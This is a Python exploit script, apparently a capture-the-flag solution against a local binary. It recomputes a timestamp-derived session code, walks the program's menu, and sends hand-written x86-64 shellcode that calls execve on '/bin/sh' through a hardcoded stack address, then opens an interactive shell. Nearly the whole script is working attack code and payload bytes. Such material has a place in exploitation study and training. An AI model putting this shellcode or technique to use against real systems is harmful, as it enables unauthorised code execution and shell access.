import interact
import struct
import re


# Pack integer 'n' into a 8-Byte representation
def p64(n):
     return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
     return struct.unpack('Q', s)[0]

p = interact.Process()


line1 = p.read()
line2 = p.read()
line3 = p.read()
line4 = p.read()
line5 = p.read()
line6 = p.read()
line7 = p.read()
line8 = p.read()

msg = line8.decode('utf-8')
id = re.findall(r'\((\d+)\)', msg)

print(f'This session ID is: {id[0]}')

#Decode the code

i = 0
timestamp=int(id[0])
constant1 = 0x3059b9c1
constant2 = 0x38e38e39
code = ""
#First iteration
while i <= 7:
    print("----------------------------")
    var0=i*2
    var1 = (constant1 >> var0) & 0xFF
    print(f"var1: 0x{var1:x} when {i}")
    var2 = var1 ^ timestamp
    print(f"var2: 0x{var2:x} when {i}")
    #Chatgpt won't save u from this part below
    var3 = ((constant2 * var2) & 0xFFFFFFFF00000000) >> 32 #EDX:EAX
    print(f"var3: 0x{var3:x} when {i}")
    var4 = var3 >> 1
    print(f"var4: 0x{var4:x} when {i}")
    var5 = var2 >> 31
    print(f"var5: 0x{var5:x} when {i}")
    var6 = var4 - var5
    print(f"var6: 0x{var6:x} when {i}")
    var7 = var6 << 3
    print(f"var7: 0x{var7:x} when {i}")
    var8 = var7 + var6
    print(f"var8: 0x{var8:x} when {i}")
    var9 = var2 - var8
    print(f"var9: 0x{var9:x} when {i}")
    ####Confirmed with registers
    #I tought this was it but then I noticed that the code generated
    #for a given timestamp is missing +1, for example
    #for a given timestamp the code was this: 54627718
    #But the generated code was: 0x4,0x3,0x5,0x1,0x6,0x6,0x0,0x7.
    #So maybe I missed something but we need to add +1 and we get the
    #code
    var10 = var9 + 1
    code += f"{var10}"
    print(f"The code is: {code} when {i}")
    #Confirmed with x/s $rbp-0x17
    i = i + 1

#set *(int*)($rbp-0x4)=2

#Exploit
p.sendline(code.encode('utf-8')) #Session 0
p.sendline(b'1')
p.sendline(b'6563602')
p.send('\n')
p.sendline(b'5') #Session1
p.sendline(b'2')
p.send('\n')
p.sendline(b'5') #Session2
p.sendline(b'2')
p.send('\n')
p.sendline(b'5') #Session3
p.sendline(b'2')
p.send('\n')
p.send('\n')
p.sendline(b'5') #Session4
p.sendline(b'2')
p.send('\n')
p.sendline(b'5') #Session?
p.sendline(b'2')
p.send('\n')
p.sendline(b'4')
p.sendline(b'y')
p.sendline(b'5')
#find 0x7ffffffde000 0x7ffffffff000 "FUCKFUCK"
#p.sendline(b'A'*24 + p64(0x7fffffffedd0))

#The last 6 bytes are stored in 0x7fffffffedc9

#Negative jump in order
                                                                                                                #0x7fffffffedd0
p.sendline(b"\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x31\xF6\x48\x89\x3C\x24\x48\x89\xE7\xEB\xE0"+ b"\xd0\xed\xff\xff\xff\x7f\x00" + b"\xB0\x3A\x04\x01\x0F\x05")





p.interactive()